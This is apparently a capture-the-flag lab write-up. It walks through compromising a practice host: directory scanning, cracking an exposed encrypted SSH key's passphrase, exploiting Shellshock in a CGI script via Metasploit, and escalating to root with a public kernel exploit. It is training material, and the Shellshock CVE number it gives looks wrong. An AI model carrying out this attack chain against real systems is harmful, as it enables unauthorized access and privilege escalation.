```
$ nmap -sV 10.10.122.206

-->
ssh 22
http 80
```
```
$ gobuster dir -u http://10.10.122.206:80 -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt

---> 
/cgi-bin              (Status: 301) [Size: 315] [--> http://10.10.122.206/cgi-bin/]
/img                  (Status: 301) [Size: 311] [--> http://10.10.122.206/img/]    
/uploads              (Status: 301) [Size: 315] [--> http://10.10.122.206/uploads/]
/admin                (Status: 301) [Size: 313] [--> http://10.10.122.206/admin/]  
/css                  (Status: 301) [Size: 311] [--> http://10.10.122.206/css/]    
/js                   (Status: 301) [Size: 310] [--> http://10.10.122.206/js/]     
/backup               (Status: 301) [Size: 314] [--> http://10.10.122.206/backup/] ---> contained rsa priv key 
/secret               (Status: 301) [Size: 314] [--> http://10.10.122.206/secret/] 
```
```
-----BEGIN RSA PRIVATE KEY----- Proc-Type: 4,ENCRYPTED DEK-Info: AES-128-CBC,82823EE792E75948EE2DE731AF1A0547 T7+F+3ilm5FcFZx24mnrugMY455vI461ziMb4NYk9YJV5uwcrx4QflP2Q2Vk8phx H4P+PLb79nCc0SrBOPBlB0V3pjLJbf2hKbZazFLtq4FjZq66aLLIr2dRw74MzHSM FznFI7jsxYFwPUqZtkz5sTcX1afch+IU5/Id4zTTsCO8qqs6qv5QkMXVGs77F2kS Lafx0mJdcuu/5aR3NjNVtluKZyiXInskXiC01+Ynhkqjl4Iy7fEzn2qZnKKPVPv8 9zlECjERSysbUKYccnFknB1DwuJExD/erGRiLBYOGuMatc+EoagKkGpSZm4FtcIO IrwxeyChI32vJs9W93PUqHMgCJGXEpY7/INMUQahDf3wnlVhBC10UWH9piIOupNN SkjSbrIxOgWJhIcpE9BLVUE4ndAMi3t05MY1U0ko7/vvhzndeZcWhVJ3SdcIAx4g /5D/YqcLtt/tKbLyuyggk23NzuspnbUwZWoo5fvg+jEgRud90s4dDWMEURGdB2Wt w7uYJFhjijw8tw8WwaPHHQeYtHgrtwhmC/gLj1gxAq532QAgmXGoazXd3IeFRtGB 6+HLDl8VRDz1/4iZhafDC2gihKeWOjmLh83QqKwa4s1XIB6BKPZS/OgyM4RMnN3u Zmv1rDPL+0yzt6A5BHENXfkNfFWRWQxvKtiGlSLmywPP5OHnv0mzb16QG0Es1FPl xhVyHt/WKlaVZfTdrJneTn8Uu3vZ82MFf+evbdMPZMx9Xc3Ix7/hFeIxCdoMN4i6 8BoZFQBcoJaOufnLkTC0hHxN7T/t/QvcaIsWSFWdgwwnYFaJncHeEj7d1hnmsAii b79Dfy384/lnjZMtX1NXIEghzQj5ga8TFnHe8umDNx5Cq5GpYN1BUtfWFYqtkGcn vzLSJM07RAgqA+SPAY8lCnXe8gN+Nv/9+/+/uiefeFtOmrpDU2kRfr9JhZYx9TkL wTqOP0XWjqufWNEIXXIpwXFctpZaEQcC40LpbBGTDiVWTQyx8AuI6YOfIt+k64fG rtfjWPVv3yGOJmiqQOa8/pDGgtNPgnJmFFrBy2d37KzSoNpTlXmeT/drkeTaP6YW RTz8Ieg+fmVtsgQelZQ44mhy0vE48o92Kxj3uAB6jZp8jxgACpcNBt3isg7H/dq6 oYiTtCJrL3IctTrEuBW8gE37UbSRqTuj9Foy+ynGmNPx5HQeC5aO/GoeSH0FelTk cQKiDDxHq7mLMJZJO0oqdJfs6Jt/JO4gzdBh3Jt0gBoKnXMVY7P5u8da/4sV+kJE 99x7Dh8YXnj1As2gY+MMQHVuvCpnwRR7XLmK8Fj3TZU+WHK5P6W5fLK7u3MVt1eq Ezf26lghbnEUn17KKu+VQ6EdIPL150HSks5V+2fC8JTQ1fl3rI9vowPPuC8aNj+Q Qu5m65A5Urmr8Y01/Wjqn2wC7upxzt6hNBIMbcNrndZkg80feKZ8RD7wE7Exll2h v3SBMMCT5ZrBFq54ia0ohThQ8hklPqYhdSebkQtU5HPYh+EL/vU1L9PfGv0zipst gbLFOSPp+GmklnRpihaXaGYXsoKfXvAxGCVIhbaWLAp5AybIiXHyBWsbhbSRMK+P -----END RSA PRIVATE KEY-----
```
We have to reorganize the ssh private key format.

Then,
```
$ python3 ssh2john.py id_rsa > crack.txt
```
```
$ john crack.txt --wordlist=/usr/share/wordlists/rockyou.txt

---> letmein 
```
```
$ nikto -h "http://10.10.122.206" | tee nikto.log

---> shellshock CVE-2016-6271 in /cgi-bin/test.cgi
```

Found metasploit has this exploit module (related to cgi)

Got a meterpretershell => then shell => then "bash -i" to get a "bash shell"

OR,

see: [shellshock in depth](https://securityintelligence.com/articles/shellshock-vulnerability-in-depth/)

=> cd /home/ryan => ls -al 
--> 
user.txt => THM{Sh3llSh0ck_r0ckz}

```
www-data@ubuntu:/home$ ls -al
ls -al
total 12
drwxr-xr-x  3 root root 4096 Sep  2  2020 .
drwxr-xr-x 22 root root 4096 Sep  2  2020 ..
lrwxrwxrwx  1 root root   14 Sep  2  2020 .secret -> /root/root.txt
drwxr-xr-x  3 ryan ryan 4096 Sep  2  2020 ryan
```

Got the version: 3.13.0-32-generic   ---> searchsploit => 37292.c

Uploaded it to /tmp directory ---> and got root shell
